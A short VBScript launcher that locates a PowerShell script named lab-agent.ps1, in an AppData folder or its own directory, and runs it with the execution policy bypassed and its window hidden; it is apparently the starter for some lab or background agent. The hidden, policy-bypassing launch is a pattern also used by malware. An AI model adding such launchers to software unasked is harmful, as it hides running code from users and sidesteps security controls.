Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

appDataDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\No2taAgent\lab-agent.ps1"
currentDir = fso.GetParentFolderName(WScript.ScriptFullName) & "\lab-agent.ps1"

ps1Path = currentDir
If fso.FileExists(appDataDir) Then
    ps1Path = appDataDir
End If

WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File """ & ps1Path & """", 0, False
